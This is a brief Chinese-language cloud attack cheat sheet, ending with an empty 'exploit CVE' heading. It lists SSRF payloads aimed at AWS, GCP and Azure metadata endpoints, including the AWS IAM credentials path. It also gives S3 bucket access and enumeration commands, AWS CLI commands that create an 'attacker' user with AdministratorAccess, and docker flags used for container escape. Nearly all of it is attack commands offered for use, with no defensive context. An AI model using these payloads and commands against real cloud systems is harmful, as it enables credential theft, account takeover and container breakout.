# 云安全漏洞

## 1. SSRF元数据攻击

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## 2. S3存储桶错配

### 公开访问

```
https://s3.amazonaws.com/bucket-name
https://bucket-name.s3.amazonaws.com
```

### 枚举

```
aws s3 ls s3://bucket-name/
```

## 3. IAM权限提升

### 创建管理员用户

```
aws iam create-user --user-name attacker
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name attacker
```

## 4. K8s容器逃逸

### 特权容器

```
docker run --privileged
```

### 挂载宿主机

```
docker run -v /:/host
```

### 利用CVE
